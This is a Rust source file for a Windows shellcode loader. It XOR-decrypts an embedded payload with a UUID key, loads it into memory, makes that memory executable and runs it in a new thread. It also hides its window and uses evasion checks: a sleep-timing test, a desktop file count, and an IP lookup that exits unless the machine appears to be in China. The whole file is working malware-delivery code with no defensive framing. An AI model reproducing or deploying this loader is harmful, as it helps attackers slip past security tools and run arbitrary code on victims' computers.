#![windows_subsystem = "windows"]
mod forgery;
use std::str;
use std::process::{exit, Command};
use std::ffi::c_void;
use std::mem::{transmute, zeroed};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Threading::{
    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};

use std::os::windows::process::CommandExt;
use winapi::um::debugapi::IsDebuggerPresent; //反调试
use std::thread;
use std::time::Duration;
use std::fs;  //桌面文件
use std::path::PathBuf;

use libloading::{Library, Symbol};
use std::ptr::{null, null_mut};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_READWRITE: u32 = 0x04;
const FALSE: i32 = 0;
const WAIT_FAILED: u32 = 0xFFFFFFFF;

#[cfg(target_os = "windows")]

fn decrypt_with_uuid(data: &[u8], uuid: &uuid::Uuid) -> Vec<u8> {
    let uuid_bytes = uuid.as_bytes();
    let uuid_len = uuid_bytes.len();
    let mut decrypted_data = Vec::new();
    for (i, byte) in data.iter().enumerate() {
        decrypted_data.push(byte ^ uuid_bytes[i % uuid_len]);
    }
    decrypted_data
}

pub fn flow_time() {
    use std::time::{Duration, Instant};
    use std::thread::sleep;

    let start_time = Instant::now();

    sleep(Duration::from_millis(300));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 300 {
        std::process::exit(1);
    }
}

// 判断出口ip
fn ip() {
    let output = Command::new("cmd")
        .args(&["/c", "curl -s https://myip.ipip.net/"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        std::process::exit(1);
    }

    let body = str::from_utf8(&output.stdout).expect("Failed to parse response");

    if body.contains("中国") {
    } else {
        std::process::exit(1);
    }
}

// 获取桌面路径，检查文件数量是否小于 10
fn check_desktop() {
    let desktop_path = get_desktop_path().expect("无法获取桌面路径");

    let entries = match fs::read_dir(&desktop_path) {
        Ok(entries) => entries,
        Err(_) => {
            
            std::process::exit(1);
        }
    };

    let file_count = entries.filter_map(|entry| entry.ok()).count();

    if file_count < 10 {
        std::process::exit(1);
    } else {
    }
}

fn get_desktop_path() -> Option<PathBuf> {
    let home_dir = dirs::home_dir()?;
    #[cfg(target_os = "windows")]
    return Some(home_dir.join("Desktop"));
    None
}

fn main() {
    thread::sleep(Duration::from_secs(3));
    flow_time();
    ip();
    check_desktop();

    //forgery::bundle::bundlefile();
    let encrypted_data = include_bytes!("encrypt.bin");
    let uuid_bytes = include_bytes!("uuidkey.txt");
    let uuid_str = str::from_utf8(uuid_bytes).expect("Failed to read UUID string");
    let uuid = uuid::Uuid::parse_str(uuid_str.trim()).expect("Invalid UUID string");

    let decrypted_data = decrypt_with_uuid(encrypted_data, &uuid);
    // decrypted shellcode

    unsafe {
        let shellcode = std::slice::from_raw_parts(decrypted_data.as_ptr(), decrypted_data.len());
        let shellcode_size = shellcode.len();

        let kernel32 = Library::new("kernel32.dll").expect("[-]no kernel32.dll!");
        let ntdll = Library::new("ntdll.dll").expect("[-]no ntdll.dll!");

        let get_last_error: Symbol<unsafe extern "C" fn() -> u32> = kernel32
            .get(b"GetLastError\0")
            .expect("[-]no GetLastError!");

        let virtual_alloc: Symbol<
            unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
        > = kernel32
            .get(b"VirtualAlloc\0")
            .expect("[-]no VirtualAlloc!");

        let virtual_protect: Symbol<
            unsafe extern "C" fn(*const c_void, usize, u32, *mut u32) -> i32,
        > = kernel32
            .get(b"VirtualProtect\0")
            .expect("[-]no VirtualProtect!");

        let rtl_copy_memory: Symbol<unsafe extern "C" fn(*mut c_void, *const c_void, usize)> =
            ntdll.get(b"RtlCopyMemory\0").expect("[-]no RtlCopyMemory!");

        let create_thread: Symbol<
            unsafe extern "C" fn(*const c_void, usize, *const c_void, u32, *mut u32) -> isize,
        > = kernel32
            .get(b"CreateThread\0")
            .expect("[-]no CreateThread!");

        let wait_for_single_object: Symbol<unsafe extern "C" fn(isize, u32) -> u32> = kernel32
            .get(b"WaitForSingleObject")
            .expect("[-]no WaitForSingleObject!");

        let addr = virtual_alloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]virtual_alloc failed: {}!", get_last_error());
        }

        rtl_copy_memory(addr, shellcode.as_ptr().cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = virtual_protect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]virtual_protect failed: {}!", get_last_error());
        }

        let handle = create_thread(null(), 0, addr, 0, null_mut());
        if handle == 0 {
            panic!("[-]create_thread failed: {}!", get_last_error());
        }

        wait_for_single_object(handle, WAIT_FAILED);
    
    }
}
